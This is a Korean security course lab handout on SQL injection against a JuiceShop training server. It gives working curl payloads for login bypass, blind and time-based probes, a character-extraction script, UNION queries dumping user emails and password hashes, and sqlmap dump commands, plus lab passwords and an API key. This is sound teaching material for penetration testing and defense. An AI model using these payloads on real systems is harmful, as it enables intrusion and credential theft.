# Week 05: 입력값 검증 (1): SQL Injection

## 학습 목표
- SQL Injection의 원리와 유형을 이해한다
- Blind SQLi, Time-based SQLi, UNION SQLi를 구분할 수 있다
- JuiceShop에서 수동 SQLi 공격을 실습한다
- sqlmap을 이용한 자동화 점검을 수행할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

# Week 05: 입력값 검증 (1): SQL Injection

## 학습 목표
- SQL Injection의 원리와 유형을 이해한다
- Blind SQLi, Time-based SQLi, UNION SQLi를 구분할 수 있다
- JuiceShop에서 수동 SQLi 공격을 실습한다
- sqlmap을 이용한 자동화 점검을 수행할 수 있다

## 전제 조건
- SQL 기본 문법 (SELECT, WHERE, AND, OR)
- curl POST 요청 (Week 02)

---

## 1. SQL Injection 개요 (20분)

### 1.1 SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 직접 삽입되어 의도하지 않은 쿼리가 실행되는 취약점이다.

```
정상 쿼리:
SELECT * FROM users WHERE email='student@test.com' AND password='Test1234!'

공격 쿼리:
SELECT * FROM users WHERE email='' OR 1=1--' AND password='아무거나'
                              ^^^^^^^^^^^^^^^^
                              삽입된 공격 코드
```

`' OR 1=1--` 가 하는 일:
1. `'` → 기존 문자열 닫기
2. `OR 1=1` → 항상 참인 조건 추가
3. `--` → 나머지 쿼리 주석 처리

### 1.2 OWASP에서의 위치

SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에서 가장 위험한 취약점 중 하나이다.

### 1.3 SQL Injection 유형

| 유형 | 설명 | 결과 확인 방법 |
|------|------|---------------|
| **Classic (In-band)** | 쿼리 결과가 화면에 직접 출력 | 응답 본문 |
| **UNION-based** | UNION으로 추가 데이터 조회 | 응답에 추가 데이터 |
| **Blind (Boolean)** | 참/거짓에 따라 응답 차이 | 응답 길이/내용 차이 |
| **Time-based Blind** | 쿼리 지연으로 참/거짓 판별 | 응답 시간 |
| **Error-based** | DB 에러 메시지에 정보 노출 | 에러 메시지 |
| **Out-of-band** | DNS/HTTP 외부 채널로 데이터 전송 | 외부 서버 로그 |

---

## 2. JuiceShop 로그인 SQLi 실습 (30분)

> **이 실습을 왜 하는가?**
> 웹 취약점 점검에서 SQL Injection은 **가장 먼저 확인**하는 항목이다.
> 실제 점검 보고서에서 SQLi 발견 시 위험도는 보통 **HIGH~CRITICAL**로 분류된다.
> 이 실습에서는 점검자의 관점에서 SQLi를 발견하고, 증거를 수집하고, 보고서에 기재하는 전 과정을 체험한다.
>
> **점검자가 확인해야 할 것:**
> 1. 로그인 폼에 `'`를 입력했을 때 500 에러가 나오는가? → SQLi 가능성
> 2. `' OR 1=1--`로 인증이 우회되는가? → 인증 우회 취약점 확인
> 3. JWT 토큰에 민감 정보(패스워드 해시)가 포함되는가? → 정보 노출 확인
> 4. UNION SELECT로 다른 테이블 데이터를 추출할 수 있는가? → 데이터 유출 확인
>
> **보고서 작성 관점:**
> - 취약점 명: SQL Injection (CWE-89)
> - 위치: /rest/user/login (email 파라미터)
> - 심각도: CRITICAL (CVSS 9.8)
> - 증거: `' OR 1=1--` 입력 시 admin JWT 반환
> - 대응: Prepared Statement 적용 권고
>
> **검증 완료:** JuiceShop에서 `' OR 1=1--`으로 admin 로그인 성공 확인

### 2.1 기본 SQLi 공격 (Classic)

> **실습 목적**: SQL Injection 취약점을 체계적으로 점검하고 공격 가능성을 증명한다
>
> **배우는 것**: Classic SQLi, Blind SQLi, Union-based SQLi 등 다양한 기법으로 입력값 검증 우회를 시도하는 방법을 배운다
>
> **결과 해석**: 인증 우회나 DB 데이터 추출에 성공하면 CRITICAL 등급의 SQLi 취약점이 확인된 것이다
>
> **실전 활용**: 웹 취약점 점검에서 SQLi는 CVSS 9.8의 최고 위험 등급으로, 발견 즉시 긴급 보고 대상이다

```bash
# 정상 로그인 시도 (실패)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'  # 요청 데이터(body)
echo ""

# SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null  # 요청 데이터(body)
echo ""

# JSON 이스케이프 버전
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"anything"}'  # 요청 데이터(body)
echo ""

# URL 인코딩 버전 (form-data 방식일 경우)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' or 1=1--","password":"x"}'        # 요청 데이터(body)
```

### 2.2 특정 사용자로 로그인

```bash
# admin 계정으로 SQLi 로그인
# admin'-- 를 이메일에 넣으면 password 체크를 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" | python3 -m json.tool 2>/dev/null
```

### 2.3 에러 메시지 분석

```bash
# 문법 오류를 유발하여 DB 정보 획득
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\''","password":"x"}'

# 에러 메시지에서 확인할 것:
# - DB 종류 (SQLite, MySQL 등)
# - 테이블 이름
# - 쿼리 구조
```

---

## 3. Blind SQL Injection (30분)

### 3.1 Boolean-based Blind SQLi 원리

서버가 쿼리 결과를 직접 보여주지 않을 때, 참/거짓에 따른 **응답 차이**로 데이터를 한 글자씩 추출한다.

```
# 첫 번째 글자가 'a'인지 확인
' OR SUBSTRING(password,1,1)='a'--   → 응답 A (참)
' OR SUBSTRING(password,1,1)='b'--   → 응답 B (거짓)
```

### 3.2 JuiceShop 검색 기능에서 Blind SQLi

```bash
# JuiceShop 상품 검색 API
# 정상 검색
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# SQLi 시도: 항상 참
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))OR+1=1--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# SQLi 시도: 항상 거짓
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+1=2--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# 결과 수 차이가 있으면 SQLi 가능성 있음
```

### 3.3 Boolean Blind로 DB 버전 추출 (개념)

```bash
# SQLite 버전의 첫 글자가 '3'인지 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null  # silent 모드

# 자동화: 한 글자씩 추출
python3 << 'PYEOF'                                     # Python 스크립트 실행
import requests, string

url = "http://10.20.30.80:3000/rest/products/search"
result = ""
for pos in range(1, 20):                               # 반복문 시작
    found = False
    for c in string.printable[:62] + ".":  # 알파벳+숫자+점
        q = f"test'))AND SUBSTR(sqlite_version(),{pos},1)='{c}'--"
        r = requests.get(url, params={"q": q}, timeout=5)
        try:
            data = r.json().get("data", [])
            if len(data) > 0:
                result += c
                print(f"위치 {pos}: '{c}' (현재: {result})")
                found = True
                break
        except:
            pass
    if not found:
        break
print(f"\nDB 버전: {result}")
PYEOF
```

---

## 4. Time-based Blind SQLi (20분)

### 4.1 원리

서버 응답에 아무 차이가 없을 때, **의도적 지연**을 유발하여 참/거짓을 판별한다.

```sql
-- SQLite: CASE WHEN 조건 THEN ... (SQLite에서는 직접적 sleep 없음)
-- MySQL:  IF(조건, SLEEP(3), 0)
-- MSSQL:  IF 조건 WAITFOR DELAY '0:0:3'
```

### 4.2 Time-based 테스트

```bash
# 응답 시간 비교
echo "=== 정상 요청 ==="
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple"

echo ""
echo "=== Time-based SQLi 시도 ==="
# SQLite는 직접적인 sleep 함수가 없지만, 무거운 연산으로 지연 유발 가능
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"

# 두 번째 요청이 현저히 느리면 Time-based SQLi 가능
```

---

## 5. UNION-based SQLi (30분)

### 5.1 원리

UNION SELECT를 이용하여 원래 쿼리 결과에 추가 데이터를 결합한다.

```sql
-- 원래 쿼리
SELECT id, name, price FROM products WHERE name LIKE '%apple%'

-- UNION 공격
SELECT id, name, price FROM products WHERE name LIKE '%test%'
UNION SELECT 1, sql, 3 FROM sqlite_master--
```

### 5.2 컬럼 수 파악

UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.

```bash
# ORDER BY로 컬럼 수 파악
# 컬럼 수보다 큰 값을 넣으면 에러 발생
for i in 1 2 3 4 5 6 7 8 9 10; do                      # 반복문 시작
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
  if echo "$result" | grep -qi "error"; then
    echo "컬럼 수: $((i-1))"
    break
  else
    echo "ORDER BY $i: OK"
  fi
done
```

### 5.3 UNION SELECT로 테이블 목록 조회

```bash
# SQLite의 sqlite_master에서 테이블 목록 추출
# 컬럼 수에 맞춰 NULL 패딩
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" | python3 -m json.tool 2>/dev/null | head -40
```

### 5.4 사용자 테이블 데이터 추출

```bash
# Users 테이블 구조 확인 후 데이터 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "  # silent 모드
import sys, json
try:
    data = json.load(sys.stdin).get('data', [])
    for item in data:                                  # 반복문 시작
        name = item.get('name', '')
        desc = item.get('description', '')
        if '@' in str(name) or '@' in str(desc):
            print(f'Email: {name}, Hash: {desc}')
except:
    print('파싱 실패 - 수동 확인 필요')
" 2>/dev/null
```

---

## 6. sqlmap 자동화 (30분)

### 6.1 기본 사용

```bash
# 검색 API에 대한 sqlmap 실행
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --level=2 --risk=1 --threads=4 \
  --technique=BEU \
  --timeout=10

# 옵션 설명:
# --batch: 모든 질문에 기본값 자동 응답
# --level=2: 점검 강도 (1~5, 높을수록 많은 페이로드)
# --risk=1: 위험도 (1~3, 높을수록 위험한 페이로드)
# --threads=4: 동시 요청 수
# --technique=BEU: Boolean, Error, Union 기법만 사용
```

### 6.2 DB 정보 추출

SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.

```bash
# 데이터베이스 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --dbs --timeout=10

# 테이블 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --tables --timeout=10

# 특정 테이블의 컬럼
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users --columns --timeout=10

# 데이터 덤프 (주의: 실제 환경에서는 반드시 허가 필요)
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users -C email,password --dump --timeout=10
```

### 6.3 POST 요청에 sqlmap 사용

SQL Injection 취약점을 자동으로 탐지하고 테스트합니다.

```bash
# 로그인 API에 대한 sqlmap
sqlmap -u "http://10.20.30.80:3000/rest/user/login" \
  --method=POST \
  --data='{"email":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch --level=2 --risk=1 --timeout=10
```

### 6.4 sqlmap 결과 해석

```
sqlmap 출력 예시:
---
Parameter: q (GET)
    Type: boolean-based blind
    Payload: q=test' AND 1=1-- -

    Type: UNION query
    Payload: q=test' UNION ALL SELECT NULL,NULL,...-- -
---

→ "q" 파라미터에 SQLi 취약점 존재
→ Boolean Blind와 UNION 두 가지 기법으로 공격 가능
```

---

## 7. SQL Injection 방어 방법 (10분)

### 7.1 Prepared Statement (Parameterized Query)

```python
# 취약한 코드
query = f"SELECT * FROM users WHERE email='{email}'"

# 안전한 코드 (Prepared Statement)
cursor.execute("SELECT * FROM users WHERE email=?", (email,))
```

### 7.2 방어 체크리스트

| 방어 기법 | 설명 |
|----------|------|
| Prepared Statement | 쿼리와 데이터 분리 (최선) |
| ORM 사용 | SQLAlchemy, Django ORM 등 |
| 입력값 검증 | 화이트리스트 기반 필터링 |
| 최소 권한 DB 계정 | DB 사용자 권한 최소화 |
| WAF | 웹 방화벽으로 SQLi 패턴 차단 |
| 에러 메시지 숨김 | 상세 DB 에러 노출 방지 |

---

## 8. 실습 과제

### 과제 1: 수동 SQLi 공격
1. JuiceShop 로그인 API에서 SQLi로 admin 계정에 로그인하라
2. 검색 API에서 UNION SELECT로 Users 테이블의 이메일 목록을 추출하라
3. 각 공격에 사용한 페이로드를 기록하라

### 과제 2: sqlmap 자동 점검
1. sqlmap으로 JuiceShop의 검색 API를 스캔하라
2. 발견된 취약점의 유형과 위험도를 정리하라
3. Users 테이블의 구조(컬럼)를 추출하라

### 과제 3: 방어 관점 분석
1. JuiceShop에서 SQLi가 가능한 이유를 코드 관점에서 추론하라
2. 이 취약점을 방어하려면 어떤 수정이 필요한지 서술하라

---

## 9. 요약

| 유형 | 핵심 기법 | 탐지 방법 |
|------|----------|----------|
| Classic | ' OR 1=1-- | 응답에 추가 데이터 |
| UNION | UNION SELECT ... | 응답에 다른 테이블 데이터 |
| Blind (Boolean) | AND SUBSTR(...)='a' | 응답 차이 (참/거짓) |
| Time-based | SLEEP(3) / 무거운 연산 | 응답 시간 차이 |
| Error-based | 문법 오류 유발 | 에러 메시지 |

**다음 주 예고**: Week 06 - 입력값 검증 (2): XSS/CSRF. Reflected/Stored/DOM XSS와 CSRF 토큰 검증을 학습한다.

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** CVSS 9.8은 어떤 심각도 등급인가?
- (a) High  (b) **Critical**  (c) Medium  (d) Low

**Q2.** 취약점 점검 시 가장 먼저 수행하는 단계는?
- (a) 익스플로잇 실행  (b) **대상 범위 확인 및 정보 수집**  (c) 보고서 작성  (d) 패치 적용

**Q3.** SQLi 취약점의 CWE 번호는?
- (a) CWE-79  (b) **CWE-89**  (c) CWE-352  (d) CWE-22

**Q4.** 점검 보고서에서 취약점의 '재현 절차'가 중요한 이유는?
- (a) 분량을 늘리기 위해  (b) **고객이 직접 확인하고 수정할 수 있도록**  (c) 법적 요건  (d) 점검 시간 기록

**Q5.** WAF(:8082)가 SQLi를 차단할 때 반환하는 HTTP 코드는?
- (a) 200 OK  (b) **403 Forbidden**  (c) 500 Internal Error  (d) 301 Redirect

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
